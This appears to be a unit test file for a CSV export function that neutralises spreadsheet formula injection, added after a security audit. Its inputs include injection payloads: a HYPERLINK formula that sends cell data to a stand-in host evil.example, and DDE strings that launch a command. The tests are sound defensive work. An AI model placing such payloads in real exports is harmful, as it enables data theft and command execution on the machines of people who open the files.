// SA-21 (security audit 2026-11): CSV exports must neutralize formula cells
// without corrupting NEMIS phone numbers or negative numbers.
import { csvCell, isFormulaLike } from '../common/csv';

describe('csvCell (SA-21)', () => {
  it.each([
    ['=HYPERLINK("https://evil.example?"&A1,"x")'],
    ['=1+1'],
    ['@SUM(A1:A2)'],
    ['+cmd|" /C calc"!A0'],
    ['-2+3+cmd|" /C calc"!A0'],
    ['\t=1+1'],
    ['\r=1+1'],
  ])('neutralizes %j with a leading apostrophe', (v) => {
    expect(isFormulaLike(v)).toBe(true);
    const out = csvCell(v);
    expect(out.replace(/^"/, '').startsWith("'")).toBe(true);
  });

  it('leaves phone numbers and negative numbers unchanged', () => {
    expect(csvCell('+254700000000')).toBe('+254700000000');
    expect(csvCell('+254 700 000 000')).toBe('+254 700 000 000');
    expect(csvCell('-12.5')).toBe('-12.5');
    expect(csvCell('-')).toBe('-');
  });

  it('leaves ordinary text unchanged', () => {
    expect(csvCell('Jane Wanjiru')).toBe('Jane Wanjiru');
    expect(csvCell('')).toBe('');
  });

  it('still quotes commas, quotes and newlines', () => {
    expect(csvCell('Doe, Jane')).toBe('"Doe, Jane"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell('a\nb')).toBe('"a\nb"');
    expect(csvCell('=A1,B1')).toBe('"\'=A1,B1"');
  });
});
